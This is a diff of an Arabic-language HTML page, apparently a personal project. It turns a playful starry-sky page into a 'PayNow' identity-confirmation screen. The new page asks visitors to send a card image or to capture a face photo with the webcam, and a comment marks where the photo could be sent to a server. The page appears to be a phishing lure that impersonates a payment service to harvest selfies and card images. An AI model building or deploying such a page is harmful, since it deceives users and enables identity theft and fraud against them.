@@ -3,56 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ايه رايك دي البداية بس🐢</title>
+    <title>PayNow - تأكيد الهوية</title>
     <style>
-        /* تعيين الخلفية سوداء مع نجوم */
         body {
-    background: url('https://images.app.goo.gl/gpWr') no-repeat center center fixed;
-    background-size: cover;
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            direction: rtl;
         }
-
-        /* تصميم النجوم */
-        .stars {
-            position: absolute;
+        .header {
+            background-color: #d10000;
+            color: white;
+            padding: 15px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        .container {
+            margin-top: 20px;
+            padding: 20px;
+        }
+        .radio-group {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 20px 0;
+        }
+        .radio-group label {
+            font-size: 18px;
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+        }
+        .radio-group input {
+            margin-left: 10px;
+            transform: scale(1.3);
+        }
+        .btn {
+            background-color: #d10000;
+            color: white;
+            padding: 10px 20px;
+            font-size: 18px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 80%;
+            max-width: 320px;
+        }
+        .btn:hover {
+            background-color: #a80000;
+        }
+        #camera-container {
+            display: none;
+            margin-top: 20px;
+        }
+        video {
             width: 100%;
-            height: 100%;
-            background: url('https://i.imgur.com/WFq1bXa.png') repeat;
-            animation: twinkling 2s infinite alternate;
+            max-width: 400px;
+            border: 2px solid #d10000;
+            border-radius: 5px;
         }
-
-        @keyframes twinkling {
-            0% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-
-        /* تصميم القمر */
-        .moon {
-            width: 150px;
-            height: 150px;
-            background: url('https://i.imgur.com/JTQ8P2Z.png') no-repeat center;
-            background-size: cover;
-            position: absolute;
-            top: 10%;
-            right: 10%;
-        }
-
-        h1 {
-            font-size: 32px;
-            position: relative;
-            z-index: 1;
+        canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <!-- النجوم -->
-    <div class="stars"></div>
+    <div class="header">الرجاء تأكيد الهوية</div>
 
-    <!-- القمر -->
-    <div class="moon"></div>
+    <div class="container">
+        <h2>اختر طريقة التأكيد</h2>
 
-    <!-- العنوان في المنتصف -->
-    <h1>ايه رايك دي البداية بس🐢</h1>
+        <div class="radio-group">
+            <label>
+                <input type="radio" name="verification" value="card"> التأكيد بالبطاقة
+            </label>
+            <label>
+                <input type="radio" name="verification" value="camera" id="cameraOption"> التأكيد المباشر
+            </label>
+        </div>
+
+        <button class="btn" onclick="startVerification()">متابعة</button>
+
+        <div id="camera-container">
+            <h3>التقط صورة لتأكيد هويتك</h3>
+            <video id="video" autoplay></video>
+            <button class="btn" onclick="captureImage()">التقاط الصورة</button>
+            <canvas id="canvas"></canvas>
+        </div>
+    </div>
+
+    <script>
+        function startVerification() {
+            const selectedOption = document.querySelector('input[name="verification"]:checked');
+
+            if (!selectedOption) {
+                alert("يرجى اختيار طريقة التأكيد");
+                return;
+            }
+
+            if (selectedOption.value === "camera") {
+                document.getElementById("camera-container").style.display = "block";
+                startCamera();
+            } else {
+                alert("يرجى تقديم صورة للبطاقة عبر البريد أو مركز الدعم.");
+            }
+        }
+
+        function startCamera() {
+            const video = document.getElementById("video");
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then((stream) => {
+                    video.srcObject = stream;
+                })
+                .catch((err) => {
+                    alert("حدث خطأ في تشغيل الكاميرا: " + err);
+                });
+        }
+
+        function captureImage() {
+            const video = document.getElementById("video");
+            const canvas = document.getElementById("canvas");
+            const context = canvas.getContext("2d");
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة إلى بيانات يمكن تخزينها
+            const imageData = canvas.toDataURL("image/png");
+
+            alert("تم التقاط الصورة بنجاح!");
+            console.log(imageData); // يمكنك إرسال الصورة إلى السيرفر هنا
+        }
+    </script>
 
 </body>
 </html>
